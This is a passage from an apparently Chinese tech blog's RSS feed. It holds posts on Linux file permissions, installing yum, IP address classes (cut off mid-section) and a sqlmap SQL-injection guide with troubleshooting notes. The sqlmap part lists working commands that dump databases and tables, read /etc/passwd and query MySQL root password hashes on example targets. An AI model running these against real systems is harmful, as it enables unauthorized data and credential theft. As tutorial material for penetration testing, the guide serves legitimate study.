sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.188/vprproject/index.php/Home/Video/index/id/189*&amp;#34;&lt;/span&gt; --batch --dbs

sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.188/vprproject/index.php/Home/Video/index/id/189*&amp;#34;&lt;/span&gt; --batch
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7常见报错&#34;&gt;7.常见报错&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Q：有时发现跑出的数据都是毫无意义的字符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A：解决方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQLMAP会提示你加–hex或者–no-cast，有时会有帮助&lt;/li&gt;
&lt;li&gt;如果你用的是time-based注射，建议增加延时–time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境&lt;/li&gt;
&lt;li&gt;增加level的数值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Q：显示unable to connect to the target url&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A：解决方案&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一个可能是 time-out 设置的太小，出现问题，再有可能就是 waf 直接把请求拦截掉了，因此得不到响应。有些 waf 比较友善，过滤后会提示“参数不合法”，但是也有些waf则直接把请求拦下来无提示导致应答超时，这样在测试时会消耗大量的时间等待响应，建议减少time-out进行检测，在跑数据时改回time-out&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Q：提示possible integer casting detected&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A：解决方案&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果是在手工测试，建议到这里可以停止了，节省时间。如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux—文件权限</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/</link>
        <pubDate>Fri, 20 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/</guid>
        <description>&lt;p&gt;&lt;strong&gt;示例文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;drwxr-x---  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root       &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 10:50 data
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root    &lt;span style=&#34;color:#ae81ff&#34;&gt;68549&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; fields.yml
-rwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;33903123&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; filebeat
-rwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root     &lt;span style=&#34;color:#ae81ff&#34;&gt;1011&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; 10:13 filebeat-docker.yml
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root    &lt;span style=&#34;color:#ae81ff&#34;&gt;66260&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; filebeat.reference.yml
-rw-------  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root     &lt;span style=&#34;color:#ae81ff&#34;&gt;7231&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; filebeat.yml
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; root root       &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; kibana
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root    &lt;span style=&#34;color:#ae81ff&#34;&gt;13675&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; LICENSE.txt
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; root root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; module
drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; modules.d
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;148778&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; NOTICE.txt
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root      &lt;span style=&#34;color:#ae81ff&#34;&gt;802&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; README.md
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;1文件权限drwxr-x---&#34;&gt;1.文件权限drwxr-x&amp;mdash;&lt;/h2&gt;
&lt;p&gt;drwxr-x&amp;mdash; 该权限分为4个部分d、rwx、r-x、&amp;mdash;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;d&lt;/strong&gt;：表示文件类型&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;rwx&lt;/strong&gt;：表示文件所有者的对该文件所拥有的权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;r-x&lt;/strong&gt;：表示文件所属组对该文件所拥有的权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;mdash;&lt;/strong&gt;：表示其他用户对该文件所拥有的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2数字表示权限&#34;&gt;2.数字表示权限&lt;/h2&gt;
&lt;p&gt;读(read)，写(write)，执行r(recute)简写即为(r,w,x),亦可用数字来(4,2,1)表示&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果某文件权限为7则代表可读(4)、可写(2)、可执行(1)，即(4+2+1=7).&lt;/li&gt;
&lt;li&gt;若权限为6(4+2)则代表可读(4)、可写(2)。&lt;/li&gt;
&lt;li&gt;若权限为5(4+1)代表可读(4)和可执行(1).&lt;/li&gt;
&lt;li&gt;若权限为3(2+1)代表可写(2)和可执行(1)。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3文件的详细信息&#34;&gt;3.文件的详细信息&lt;/h2&gt;
&lt;p&gt;第一个减号代表的是文件类型：-：普通文件，d:目录文件，l:链接文件，b:设备文件，c:字符设备文件，p:管道文件&lt;/p&gt;
&lt;p&gt;第二个符号开始表示文件的权限，rw-r-r- 也就是分别表示所有者(属主)有读写权限，所有组(属组)有读权限，其余人也仅有读权限。&lt;/p&gt;
&lt;h2 id=&#34;4授权&#34;&gt;4.授权&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;chmod -R &lt;span style=&#34;color:#ae81ff&#34;&gt;755&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 该命令表示文件所有者有读写执行权限（4+2+1）、文件所属组有读执行权限（4+1）、其他人有读执行权限（4+1）&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# chmod 参数----------------------------------------------------&lt;/span&gt;
-c : 若该文件权限确实已经更改，才显示其更改动作
-f : 若该文件权限无法被更改也不要显示错误讯息
-v : 显示权限变更的详细资料
-R : 对目前目录下的所有文件与子目录进行相同的权限变更
--help : 显示辅助说明
--version : 显示版本 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—yum 软件管理工具</title>
        <link>https://ac-lm.github.io/posts/linux/linuxyum-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxyum-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1yum&#34;&gt;1.yum&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 新建一个目录用来保存yum安装包 &lt;/span&gt;
mkdir install
&lt;span style=&#34;color:#75715e&#34;&gt;# 进入文件夹并输入命令&lt;/span&gt;
cd install
wget http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;yum&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;baseurl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;org&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;download&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;yum&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.2.28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gz
&lt;span style=&#34;color:#75715e&#34;&gt;# 解压&lt;/span&gt;
tar &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xvf yum&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.2.28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gz
&lt;span style=&#34;color:#75715e&#34;&gt;# 重点：解压后先不着急安装，手动创建一个yum的conf文件，不然会报找不到文件的错 yum.cli:Config Error: Error accessing file for config file:///etc/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# touch /etc/yum.conf&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 进入yum目录，脚本安装&lt;/span&gt;
cd yum&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.2.28&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;yummain&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py install yum
&lt;span style=&#34;color:#75715e&#34;&gt;# 期间会提示安装新版本，y回车即可&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用&#34;&gt;2.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;yum -y remove xxxx     &lt;span style=&#34;color:#75715e&#34;&gt;#卸载&lt;/span&gt;
yum -y install xxxxx   &lt;span style=&#34;color:#75715e&#34;&gt;#安装&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Net—sqlmap 使用指南</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
        <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h2 id=&#34;1sqlmap中部分参数的备注&#34;&gt;1.sqlmap中部分参数的备注&lt;/h2&gt;
&lt;h3 id=&#34;星号--&#34;&gt;星号（ * ）&lt;/h3&gt;
&lt;p&gt;在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：&lt;code&gt;&#39;/admin/1/&#39;&lt;/code&gt;，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如&lt;code&gt;sqlmap -u &amp;quot;www.baidu.com/admin/1*&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;--data&#34;&gt;&amp;ndash;data&lt;/h3&gt;
&lt;p&gt;使用 post 方式提交时，需要用到 data 参数&lt;/p&gt;
&lt;h3 id=&#34;-p&#34;&gt;-p&lt;/h3&gt;
&lt;p&gt;当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间&lt;/p&gt;
&lt;h3 id=&#34;--level&#34;&gt;&amp;ndash;level&lt;/h3&gt;
&lt;p&gt;不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。&lt;/p&gt;
&lt;h3 id=&#34;--random-agent&#34;&gt;&amp;ndash;random-agent&lt;/h3&gt;
&lt;p&gt;使用该参数，sqlmap 会自动的添加 useragent 参数，你也可以用 user-agent 选项指定所需的 agent&lt;/p&gt;
&lt;h3 id=&#34;--technique&#34;&gt;&amp;ndash;technique&lt;/h3&gt;
&lt;p&gt;这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;B：Boolean-based blind SQL injection（布尔型注入）&lt;/li&gt;
&lt;li&gt;E：Error-based SQL injection（报错型注入）&lt;/li&gt;
&lt;li&gt;U：UNION query SQL injection（可联合查询注入）&lt;/li&gt;
&lt;li&gt;S：Stacked queries SQL injection（可多语句查询注入）&lt;/li&gt;
&lt;li&gt;T：Time-based blind SQL injection（基于时间延迟注入）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2常用的指令&#34;&gt;2.常用的指令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 检查注入点 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34;&lt;/span&gt; --dbs  &lt;span style=&#34;color:#75715e&#34;&gt;# 列出数据库信息    &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34;&lt;/span&gt; -D xxxxx --tables            &lt;span style=&#34;color:#75715e&#34;&gt;# 指定库名, 并列出所有表&lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34;&lt;/span&gt; -D xxxxx -T admin --columns  &lt;span style=&#34;color:#75715e&#34;&gt;# 指定库名, 并表名列出所有字段&lt;/span&gt;
                                                                               
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --dbs              &lt;span style=&#34;color:#75715e&#34;&gt;# 列出数据库   &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --current-db       &lt;span style=&#34;color:#75715e&#34;&gt;# 列出当前数据库  &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --users            &lt;span style=&#34;color:#75715e&#34;&gt;# 列出数据库用户  &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --current-user     &lt;span style=&#34;color:#75715e&#34;&gt;# 列出当前用户  &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --tables -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;数据库&amp;#34;&lt;/span&gt;                         &lt;span style=&#34;color:#75715e&#34;&gt;# 列出数据库的表名  &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --columns -T &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;表名&amp;#34;&lt;/span&gt; -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;数据库&amp;#34;&lt;/span&gt;               &lt;span style=&#34;color:#75715e&#34;&gt;# 获取表的列名  &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;注入地址&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --dump -C &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;字段,字段&amp;#34;&lt;/span&gt; -T &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;表名&amp;#34;&lt;/span&gt; -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;数据库&amp;#34;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 获取表中的数据   &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3sqlmap参数使用实例&#34;&gt;3.Sqlmap参数使用实例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 指定参数注入 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt; 
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat,id&amp;#34;&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定方法和post的数据 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php&amp;#34;&lt;/span&gt; --method &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt; --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定cookie,可以注入一些需要登录的地址 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; --cookie &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;COOKIE_VALUE&amp;#34;&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; --string &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;STRING_ON_TRUE_PAGE&amp;#34;&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# 显示指定的文件内容，一般用于php &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; --file-read /etc/passwd 
&lt;span style=&#34;color:#75715e&#34;&gt;# 执行你自己的sql语句&lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --sql-query&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SELECT password FROM mysql.user WHERE user = &amp;#39;root&amp;#39; LIMIT 0, 1&amp;#34;&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# union注入 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; --union-check 
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --union-use --banner 
&lt;span style=&#34;color:#75715e&#34;&gt;# 保存注入过程到一个文件, 支持从文件恢复出注入过程 &lt;/span&gt;
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -b -o &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sqlmap.log&amp;#34;&lt;/span&gt; 
sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.47/page.php?id=1&amp;amp;cat=2&amp;#34;&lt;/span&gt; -v &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --banner -o &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sqlmap.log&amp;#34;&lt;/span&gt; --resume
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>计算机网络—什么是 IP</title>
        <link>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BB%80%E4%B9%88%E6%98%AF-ip/</link>
        <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BB%80%E4%B9%88%E6%98%AF-ip/</guid>
        <description>&lt;h2 id=&#34;1ip的分类&#34;&gt;1.IP的分类&lt;/h2&gt;
&lt;p&gt;Internet 上的每台主机和路由器都拥有一个由网络号和主机号唯一组成的 IP 地址，而且任意两台机器的 IP 地址互不相同。所有的 IP 地址都是一个 32 位长的二进制数，根据网络号和主机号分组方式的不同，细分为 A、B、C、D、E 五类。&lt;/p&gt;
&lt;h3 id=&#34;1a类地址&#34;&gt;1）A类地址&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;第一位总是 0，8 位分配给网络号，24 位分配给主机号&lt;/li&gt;
&lt;li&gt;地址范围为：0.0.0.0 ~ 127.255.255.255&lt;/li&gt;
&lt;li&gt;二进制 32 位：&lt;strong&gt;0000-0000&lt;/strong&gt;.0000-0000.0000-0000.0000-0000 ~ &lt;strong&gt;0111-1111&lt;/strong&gt;.1111-1111.1111-1111.1111-1111&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2b类地址&#34;&gt;2）B类地址&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;前两位总是 10，16 位分配给网络号，16 位分配给主机号&lt;/li&gt;
&lt;li&gt;地址范围是：128.0.0.0 ~ 191.255.255.255&lt;/li&gt;
&lt;li&gt;网络号：1000-0000.0000-0000 ~ 1011-1111.1111-1111&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3c类地址&#34;&gt;3）C类地址&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;前三位总是 110，24 位分配给网络号，8 位分配给主机号&lt;/li&gt;
&lt;li&gt;地址范围是：192.0.0.0 ~ 223.255.255.255&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4d类地址&#34;&gt;4）D类地址&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;前四位总是 1110，D 类地址作为组播地址（一对多的通信）&lt;/li&gt;
&lt;li&gt;地址范围是 224.0.0.0 ~ 239.255.255.255&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5e类地址&#34;&gt;5）E类地址&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;前五位总是 11110，E 类地址为保留地址，供以后使用&lt;/li&gt;
&lt;li&gt;地址范围是 240.0.0.0 ~ 255.255.255.255&lt;/li&gt;
&lt;li&gt;注：只有 A，B，C 有网络号和主机号之分，D 类地址和 E 类地址没有划分网络号和主机号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-ip地址-0000--与-255255255255&#34;&gt;2. IP地址 0.0.0.0  与 255.255.255.255&lt;/h2&gt;
&lt;h3 id=&#34;10000&#34;&gt;1）0.0.0.0&lt;/h3&gt;
&lt;p&gt;缺省路由，代表本地，可以用来寻找自己在网络中的 IP 地址。例如在 RARP，BOOTP 和 DHCP 协议中，若某个未知 IP 地址（缺省 0.0.0.0 ）的机器想要知道自己在网络中的 IP 地址，它就可以把 255.255.255.255 作为目的地址，向本地范围内所有的服务器发送 IP 请求分组指令。&lt;/p&gt;
&lt;h3 id=&#34;2255255255255&#34;&gt;2）255.255.255.255&lt;/h3&gt;
